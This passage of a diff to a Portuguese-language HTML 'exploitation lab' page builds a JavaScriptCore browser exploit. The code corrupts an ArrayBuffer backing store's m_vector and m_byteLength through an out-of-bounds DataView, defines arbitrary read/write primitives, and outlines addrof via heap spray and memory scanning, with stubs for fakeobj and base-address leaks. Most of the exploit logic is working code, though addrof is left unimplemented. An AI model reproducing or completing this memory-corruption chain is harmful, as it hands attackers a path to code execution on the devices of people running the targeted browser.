-                            log(`oob_read_temp para ${address64.toString(true)}: <span class="todo">PRECISA DE IMPLEMENTAÇÃO PARA MAPEAMENTO DE ENDEREÇO</span>`, "warn", "oob_rw_temp");
-                            // Exemplo muito básico (e provavelmente incorreto sem mapeamento de endereço):
-                            // try { let d = new Uint8Array(size); for(let i=0; i<size; i++) d[i] = oob_dataview_real.getUint8(address64.low() + i); return d; } catch(e){return null;}
-                            return null; 
-                        };
-                        const oob_write_temp = (address64, data_u8) => {
-                            log(`oob_write_temp para ${address64.toString(true)}: <span class="todo">PRECISA DE IMPLEMENTAÇÃO PARA MAPEAMENTO DE ENDEREÇO</span>`, "warn", "oob_rw_temp");
-                            // try { for(let i=0; i<data_u8.length; i++) oob_dataview_real.setUint8(address64.low() + i, data_u8[i]); return true; } catch(e){return false;}
-                            return false;
-                        };
-                        current_read = oob_read_temp;
-                        current_write = oob_write_temp;
-                        log("Primitivas de leitura/escrita temporárias (baseadas em OOB) definidas. Sua eficácia é incerta.", "info", FNAME);
-                    } else {
-                        log("Nenhuma primitiva de OOB (`oob_dataview_real`) ou R/W arbitrária disponível.", "error", FNAME);
-                        return;
-                    }
-                }
-
-                // Passo 1: Obter o endereço do JSCell do victim_view_for_arb_rw (que é um Uint8Array)
-                addr_jscell_victim_view = addrof_primitive(victim_view_for_arb_rw);
-                if (!addr_jscell_victim_view) { log("Falha ao obter o endereço do JSCell da vítima com `addrof`.", "error", FNAME); return; }
-                log(`Endereço do JSCell de victim_view_for_arb_rw (Uint8Array): ${addr_jscell_victim_view.toString(true)}`, "leak", FNAME);
-
-                // Passo 2: Ler o ponteiro para o ArrayBufferBackingStore
-                const ptr_to_backing_store_location = addr_jscell_victim_view.add(JSC_VIEW_TO_BACKING_STORE_PTR_OFFSET);
-                log(`Tentando ler ponteiro para BackingStore em: ${ptr_to_backing_store_location.toString(true)} (JSCell_View + ${JSC_VIEW_TO_BACKING_STORE_PTR_OFFSET.toString()})`, "info", FNAME);
-                const backing_store_ptr_bytes = current_read(ptr_to_backing_store_location, 8);
-
-                if (!backing_store_ptr_bytes || backing_store_ptr_bytes.length < 8) { log("Falha ao ler ponteiro para ArrayBufferBackingStore.", "error", FNAME); return; }
-                addr_backing_store_of_victim = new AdvancedInt64(backing_store_ptr_bytes);
-                log(`Endereço do ArrayBufferBackingStore da vítima: ${addr_backing_store_of_victim.toString(true)}`, "leak", FNAME);
-                log("Use HexDump para verificar a estrutura do BackingStore neste endereço (deve ter m_vector @ +0x10, m_byteLength @ +0x20).", "info", FNAME);
-
-                // Passo 3: Corromper m_vector e m_byteLength DENTRO do ArrayBufferBackingStore
-                const addr_m_vector_field = addr_backing_store_of_victim.add(OFFSET_BACKING_STORE_VECTOR_PTR);
-                const addr_m_byteLength_field = addr_backing_store_of_victim.add(OFFSET_BACKING_STORE_BYTE_LENGTH);
+                // Fase 2: Corromper m_vector e m_byteLength usando oob_dataview_real
+                const offset_to_m_vector = found_backing_store_offset_in_oob_dv + OFFSET_BACKING_STORE_VECTOR_PTR.low();
+                const offset_to_m_byteLength = found_backing_store_offset_in_oob_dv + OFFSET_BACKING_STORE_BYTE_LENGTH.low();
 
                 const new_vector_val = AdvancedInt64.Zero; 
                 const new_length_val_u32 = 0xFFFFFFFF; 
-                const new_length_val_bytes = new Uint8Array(new AdvancedInt64(new_length_val_u32).bytes.slice(0,4)); 
 
-                log(`Escrevendo novo m_vector (${new_vector_val.toString(true)}) em ${addr_m_vector_field.toString(true)}`, "info", FNAME);
-                let write_ok_vector = current_write(addr_m_vector_field, new_vector_val.bytes);
+                log(`Escrevendo novo m_vector (${new_vector_val.toString(true)}) em offset ${offset_to_m_vector} do \`oob_dataview_real\``, "info", FNAME);
+                readWriteUtils.write64(oob_dataview_real, offset_to_m_vector, new_vector_val);
                 
-                log(`Escrevendo novo m_byteLength (${generalUtils.toHexLab(new_length_val_u32)}) em ${addr_m_byteLength_field.toString(true)}`, "info", FNAME);
-                let write_ok_length = current_write(addr_m_byteLength_field, new_length_val_bytes); 
+                log(`Escrevendo novo m_byteLength (${generalUtils.toHexLab(new_length_val_u32)}) em offset ${offset_to_m_byteLength} do \`oob_dataview_real\``, "info", FNAME);
+                readWriteUtils.write32(oob_dataview_real, offset_to_m_byteLength, new_length_val_u32); 
 
                 await PAUSE_LAB(100);
 
-                if (write_ok_vector && write_ok_length) {
-                    log("Corrupção de m_vector e m_byteLength via `current_write` (aparentemente) bem-sucedida!", "vuln", FNAME);
+                log(`Verificando ab_to_corrupt_initially.byteLength: ${ab_to_corrupt_initially.byteLength}`, "info", FNAME);
+                if (ab_to_corrupt_initially.byteLength === new_length_val_u32 || ab_to_corrupt_initially.byteLength === (new_length_val_u32 >>> 0)) {
+                    log("SUCESSO! `ab_to_corrupt_initially` foi corrompido!", "critical", FNAME);
                     
-                    const underlying_corrupted_buffer = victim_view_for_arb_rw.buffer; // O ArrayBuffer associado ao Uint8Array
-                    log(`Verificando underlying_corrupted_buffer.byteLength: ${underlying_corrupted_buffer.byteLength}`, "info", FNAME);
+                    let initially_corrupted_dv = new DataView(ab_to_corrupt_initially); // DataView sobre o AB corrompido
+                    log("`initially_corrupted_dv` criado. Este é sua PRIMEIRA primitiva de R/W Arbitrário.", "good", FNAME);
 
-                    if (underlying_corrupted_buffer.byteLength === new_length_val_u32 || underlying_corrupted_buffer.byteLength === (new_length_val_u32 >>> 0)) {
-                        log("SUCESSO CONFIRMADO! O byteLength do ArrayBuffer subjacente reflete a corrupção.", "critical", FNAME);
-                        corrupted_data_view_for_arb_rw = new DataView(underlying_corrupted_buffer);
-                        log("`corrupted_data_view_for_arb_rw` (DataView sobre o buffer corrompido) criado.", "good", FNAME);
-                        log("Este DataView agora DEVE permitir Leitura/Escrita Arbitrária total.", "good", FNAME);
-
-                        arb_read_primitive = (address64, size) => { /* ... (mesma da v2.4) ... */ if (!corrupted_data_view_for_arb_rw) { log("corrupted_data_view_for_arb_rw não está pronto.", "error", "arb_read_GLOBAL"); return null; } if (!(address64 instanceof AdvancedInt64)) { log("Endereço deve ser AdvancedInt64.", "error", "arb_read_GLOBAL"); return null;} try { let result = new Uint8Array(size); if (address64.high() !== 0 && !(address64.high() === -1 && address64.low() < 0) ) {} for (let i = 0; i < size; i++) { result[i] = corrupted_data_view_for_arb_rw.getUint8(address64.low() + i); } return result; } catch (e) { log(`Erro em arb_read_GLOBAL(${address64.toString(true)}, ${size}): ${e.message}`, "error", "arb_read_GLOBAL"); return null; } };
-                        arb_write_primitive = (address64, data_array_or_u8) => { /* ... (mesma da v2.4) ... */ if (!corrupted_data_view_for_arb_rw) { log("corrupted_data_view_for_arb_rw não está pronto.", "error", "arb_write_GLOBAL"); return false; } if (!(address64 instanceof AdvancedInt64)) { log("Endereço deve ser AdvancedInt64.", "error", "arb_write_GLOBAL"); return false;} if (address64.high() !== 0 && !(address64.high() === -1 && address64.low() < 0)) {} try { const data_u8 = (data_array_or_u8 instanceof Uint8Array) ? data_array_or_u8 : new Uint8Array(data_array_or_u8); for (let i = 0; i < data_u8.length; i++) { corrupted_data_view_for_arb_rw.setUint8(address64.low() + i, data_u8[i]); } return true; } catch (e) { log(`Erro em arb_write_GLOBAL(${address64.toString(true)}, data): ${e.message}`, "error", "arb_write_GLOBAL"); return false; } };
-                        
-                        log("NOVAS PRIMITIVAS `arb_read_primitive` e `arb_write_primitive` GLOBAIS ATIVAS!", "critical", FNAME);
-                        log("Use o HexDump no Passo 6 para testar a leitura arbitrária.", "info", FNAME);
-                    } else {
-                         log(`DISCREPÂNCIA no byteLength do buffer subjacente! Atual: ${underlying_corrupted_buffer.byteLength}, Esperado (U32): ${new_length_val_u32 >>> 0}`, "error", FNAME);
-                    }
+                    arb_read_primitive = (address64, size) => { /* ... (mesma da v2.4, mas usa initially_corrupted_dv) ... */ if (!initially_corrupted_dv) { log("initially_corrupted_dv não está pronto.", "error", "arb_read_GLOBAL"); return null; } if (!(address64 instanceof AdvancedInt64)) { log("Endereço deve ser AdvancedInt64.", "error", "arb_read_GLOBAL"); return null;} try { let result = new Uint8Array(size); if (address64.high() !== 0 && !(address64.high() === -1 && address64.low() < 0) ) {} for (let i = 0; i < size; i++) { result[i] = initially_corrupted_dv.getUint8(address64.low() + i); } return result; } catch (e) { log(`Erro em arb_read_GLOBAL(${address64.toString(true)}, ${size}): ${e.message}`, "error", "arb_read_GLOBAL"); return null; } };
+                    arb_write_primitive = (address64, data_array_or_u8) => { /* ... (mesma da v2.4, mas usa initially_corrupted_dv) ... */ if (!initially_corrupted_dv) { log("initially_corrupted_dv não está pronto.", "error", "arb_write_GLOBAL"); return false; } if (!(address64 instanceof AdvancedInt64)) { log("Endereço deve ser AdvancedInt64.", "error", "arb_write_GLOBAL"); return false;} if (address64.high() !== 0 && !(address64.high() === -1 && address64.low() < 0)) {} try { const data_u8 = (data_array_or_u8 instanceof Uint8Array) ? data_array_or_u8 : new Uint8Array(data_array_or_u8); for (let i = 0; i < data_u8.length; i++) { initially_corrupted_dv.setUint8(address64.low() + i, data_u8[i]); } return true; } catch (e) { log(`Erro em arb_write_GLOBAL(${address64.toString(true)}, data): ${e.message}`, "error", "arb_write_GLOBAL"); return false; } };
+                    
+                    log("PRIMERIAS `arb_read_primitive` e `arb_write_primitive` GLOBAIS DEFINIDAS!", "critical", FNAME);
+                    log("Use o HexDump (Passo 6, se você o adicionar de volta) ou `searchMemoryForValue` para testar.", "info", FNAME);
                 } else {
-                    log("Falha ao corromper m_vector e/ou m_byteLength via escrita.", "error", FNAME);
+                    log(`Falha ao corromper byteLength. Atual: ${ab_to_corrupt_initially.byteLength}, Esperado (U32): ${new_length_val_u32 >>> 0}`, "error", FNAME);
                 }
             }
             
-            async function attemptBaseAddressLeak() { /* ... (mesma da v2.4) ... */ }
-            async function searchMemoryForValue() { /* ... (mesma da v2.4) ... */ }
+            async function attemptBaseAddressLeak() { /* ... (mesma da v2.4, depende de arb_read_primitive) ... */ }
+            async function searchMemoryForValue() { /* ... (mesma da v2.4, depende de arb_read_primitive) ... */ }
 
             async function manualSetupAndAddrofTest() {
                 const FNAME = "manualSetupAndAddrofTest";
-                if (!await setupHeapAndVictim()) return;
+                // Não chama mais setupHeapAndVictim, pois o foco é em addrof para o Uint8Array `victim_view_for_arb_rw`
+                // que é criado em `setupVictimForAddrofTarget`
+                if (!await setupVictimForAddrofTarget()) return;
                 await testAddrof();
             }
 
-            async function testAddrof() {
+            async function setupVictimForAddrofTarget(){
+                const FNAME = "setupVictimForAddrofTarget";
+                log("Configurando vítima Uint8Array para `addrof`...", "info", FNAME);
+                victim_view_for_addrof_target = new Uint8Array(128);
+                for(let i=0; i<victim_view_for_addrof_target.length; i++) victim_view_for_addrof_target[i] = 0xEE;
+                window.victim_view_for_arb_rw_GLOBAL = victim_view_for_addrof_target; // Reutilizando o nome global para o input
+                log(`\`victim_view_for_addrof_target\` (Uint8Array) criado e exposto como window.victim_view_for_arb_rw_GLOBAL.`, "info", FNAME);
+                return true;
+            }
+
+            async function testAddrof() { /* ... (mesma da v2.4, mas com mais foco na leitura do StructureID) ... */
                 const FNAME = "testAddrof";
-                log("--- Testando `addrof(obj)` ---", "test", FNAME);
                 let objNameToTest = document.getElementById('addrofObjectName').value;
                 let objToTest;
-                try { 
-                    objToTest = eval(objNameToTest); // CUIDADO com eval. Use apenas para objetos conhecidos.
-                    if (typeof objToTest === 'undefined') throw new Error("Objeto não encontrado ou undefined.");
-                } catch(e) { 
-                    log(`Erro ao obter objeto '${objNameToTest}': ${e.message}`, "error", FNAME); 
-                    if (objNameToTest === "victim_view_for_arb_rw_GLOBAL" && !window.victim_view_for_arb_rw_GLOBAL) {
-                        log("Execute 'Preparar Vítima' primeiro se estiver testando `victim_view_for_arb_rw_GLOBAL`.", "warn", FNAME);
-                    }
-                    return;
-                }
-                log(`Testando addrof para: ${objNameToTest}`, "info", FNAME);
+                try { objToTest = eval(objNameToTest); if (typeof objToTest === 'undefined') throw new Error("Objeto não encontrado.");} 
+                catch(e) { log(`Erro ao obter objeto '${objNameToTest}': ${e.message}`, "error", FNAME); return;}
+                log(`--- Testando \`addrof\` para: ${objNameToTest} ---`, "test", FNAME);
 
-                if (!arb_read_primitive) { 
-                    log("`arb_read_primitive` é necessária para a implementação robusta de `addrof`. Tente obtê-la primeiro (Passo 1.A).", "error", FNAME);
-                    log("Se você tem uma OOB Read inicial (`oob_dataview_real`) muito boa, pode tentar uma implementação de `addrof` mais limitada com ela.", "info", FNAME);
-                     if (oob_leaked_ptr_real) log(`Lembre-se do OOB leak inicial: ${oob_leaked_ptr_real.value.toString(true)}`, "info");
-                    // return; // Comentar para permitir a execução do stub conceitual abaixo
-                }
+                if (!arb_read_primitive) { log("`arb_read_primitive` é NECESSÁRIA para `addrof`. Obtenha-a no Passo 1.A.", "error", FNAME); return; }
 
                 if (!addrof_primitive) {
-                    addrof_primitive = (target_obj) => {
+                    addrof_primitive = (target_obj_for_addrof) => {
                         const FIMPL = "addrof_impl";
                         log("`addrof_primitive` (Conceitual): Tentando encontrar endereço...", "tool", FIMPL);
-                        // Esta é uma implementação CONCEITUAL e precisa de MUITA adaptação e RE.
-                        // Pré-requisito: arb_read_primitive funcional OU uma oob_dataview_real muito versátil.
+                        log("<span class='todo'>VOCÊ PRECISA IMPLEMENTAR A LÓGICA DE HEAP SPRAY E VARREDURA ABAIXO:</span>", "warn", FIMPL);
+                        
+                        // Estratégia Sugerida:
+                        // 1. Spray de Objetos: Crie um array grande. Em cada índice, coloque um objeto wrapper
+                        //    que contém um marcador e o `target_obj_for_addrof`.
+                        //    Ex: spray_array[i] = {marker: 0xCAFEBABE + i, real_obj: target_obj_for_addrof}
+                        // 2. Encontre o `spray_array` na memória (este é o passo mais difícil sem um addrof inicial).
+                        //    Pode ser necessário um vazamento de ponteiro do heap JS inicial de `oob_leaked_ptr_real`.
+                        // 3. Uma vez que você tenha o endereço do `spray_array.JSCell` e/ou seu `butterfly`:
+                        //    Itere pelo butterfly. Cada entrada é um JSValue (8 bytes) que aponta para o objeto wrapper.
+                        //    Leia o JSValue, decodifique-o para obter o endereço do JSCell do objeto wrapper.
+                        //    Leia o campo `real_obj` do wrapper (requer saber o offset de `real_obj` dentro do wrapper).
+                        //    O valor lido será o JSValue do `target_obj_for_addrof`. Decodifique-o para obter o ponteiro do JSCell.
 
-                        // Estratégia:
-                        // 1. Spray de Objetos: Alocar muitos objetos (ex: Array) e colocar o `target_obj` entre eles.
-                        //    Isso aumenta a chance de o `target_obj` estar perto de algo cujo endereço você possa vazar/deduzir,
-                        //    ou dentro de uma área que você possa escanear.
-                        const spray_size = 100;
-                        let object_spray = [];
-                        for (let i = 0; i < spray_size; i++) {
-                            object_spray.push({marker_start: 0x41414141+i, obj: (i === Math.floor(spray_size/2) ? target_obj : {dummy:0xB1B1B1B1+i}), marker_end: 0x42424242+i });
-                        }
-                        log(`Spray de ${spray_size} objetos criado. O alvo está no meio.`, "info", FIMPL);
-
-                        // 2. Encontrar o Spray na Memória:
-                        //    - Se você tem um `oob_leaked_ptr_real` que aponta para o heap JS, comece a escanear a partir daí.
-                        //    - Use `arb_read_primitive` (ou `oob_dataview_real` com limitações) para procurar pelos `marker_start`.
-                        let base_scan_address = oob_leaked_ptr_real ? oob_leaked_ptr_real.value : new AdvancedInt64("0x1c0000000"); // EXEMPLO DE ENDEREÇO DE HEAP
-                        let found_object_jscell_address = null;
-
-                        log(`Iniciando varredura de memória a partir de ${base_scan_address.toString(true)} para encontrar o spray...`, "info", FIMPL);
-                        // <span class="todo">TODO: Implementar lógica de varredura aqui.</span>
-                        //  for (let scan_offset = 0; scan_offset < 0x100000 /* Exemplo de range */; scan_offset += 8 /* Alinhamento JSCell */) {
-                        //      let current_addr = base_scan_address.add(new AdvancedInt64(scan_offset));
-                        //      let potential_marker_bytes = arb_read_primitive(current_addr.add(OFFSET_TO_MARKER_IN_SPRAYED_OBJ), 4);
-                        //      if (potential_marker_bytes && readWriteUtils.read32(potential_marker_bytes,0)startsWith(0x41414141) ) {
-                        //          // Encontrou um marcador! Agora precisa verificar se é o objeto correto e obter o ponteiro para `target_obj`.
-                        //          // Se a estrutura do objeto pulverizado for {marker, JSCell_ptr_target_obj, marker},
-                        //          // então leia JSCell_ptr_target_obj.
-                        //          // O endereço do JSCell_ptr_target_obj seria current_addr.add(OFFSET_TO_JSCELL_PTR_IN_SPRAYED_OBJ)
-                        //          // found_object_jscell_address = read_qword(that_address);
-                        //          // break;
-                        //      }
-                        //  }
-                        log("<span class='todo'>IMPLEMENTAR VARREDURA DE HEAP E LÓGICA DE IDENTIFICAÇÃO DE OBJETO AQUI</span>", "warn", FIMPL);
-
-
-                        if (found_object_jscell_address) {
-                            log(`addrof: Endereço candidato para JSCell de target_obj: ${found_object_jscell_address.toString(true)}`, "leak", FIMPL);
-                            // Verificação adicional: Ler o StructureID de found_object_jscell_address
-                            let struct_id_bytes = arb_read_primitive(found_object_jscell_address.add(OFFSET_JSCELL_STRUCTURE_ID), 8);
-                            if (struct_id_bytes) {
-                                log(`  StructureID lido em ${found_object_jscell_address.toString(true)}: ${new AdvancedInt64(struct_id_bytes).toString(true)}`, "info", FIMPL);
-                                // TODO: Comparar com StructureIDs conhecidos se possível.
-                            }
-                            return found_object_jscell_address;
-                        } else {
-                            log("addrof: Não foi possível encontrar o objeto alvo no spray (lógica de varredura não implementada).", "warn", FIMPL);
-                            return null;
-                        }
+                        // Exemplo de verificação de JSCell (se você tiver um endereço candidato `candidate_addr`):
+                        // let struct_id_bytes = arb_read_primitive(candidate_addr.add(OFFSET_JSCELL_STRUCTURE_ID), 8);
+                        // if (struct_id_bytes) {
+                        //    log(`  StructureID lido em ${candidate_addr.toString(true)}: ${new AdvancedInt64(struct_id_bytes).toString(true)}`, "analysis", FIMPL);
+                        //    // TODO: Compare com StructureIDs conhecidos.
+                        // }
+                        log("Lógica de `addrof` não implementada. Retornando null.", "warn", FIMPL);
+                        return null; 
                     };
-                    log("`addrof_primitive` (conceitual com estratégia de spray) definida.", "info", FNAME);
+                    log("`addrof_primitive` (conceitual) definida. <span class='todo'>Adapte e implemente!</span>", "info", FNAME);
                 }
                 
                 let addr = addrof_primitive(objToTest);
                 if(addr) { log(`addrof(${objNameToTest}) = ${addr.toString(true)}`, "leak", FNAME); } 
-                else { log(`addrof(${objNameToTest}) falhou. Verifique a implementação e logs de 'addrof_impl'.`, "warn", FNAME); }
+                else { log(`addrof(${objNameToTest}) falhou ou não implementado.`, "warn", FNAME); }
             }
 
-            async function testFakeobj() { /* ... (implementação da v2.3) ... */ }
+            async function testFakeobj() { /* ... (mesma da v2.4, mas depende de addrof e arb_write funcionais) ... */ }
         </script>
     </div>
     
     <script>
-        log("Laboratório de Exploração Avançada (v2.5 - Foco Intenso Passo 1 Simplificado) Carregado.", "good", "Init");
-        log("Passos 2-6 removidos para foco. Concentre-se em implementar o Passo 1.", "info", "Init");
-        log("CRÍTICO: Implemente `addrof_primitive` primeiro. Depois, use-o para `attemptArrayBufferCorruptionAndSetupArbRW`.", "warn", "Init");
+        log("Laboratório de Exploração Avançada (v2.5.1 - Foco Corrupção Inicial AB) Carregado.", "good", "Init");
+        log("FOCO TOTAL NO PASSO 1. Comece com '1. Corromper AB Inicial'.", "critical", "Init");
     </script>
 </body>
 </html>
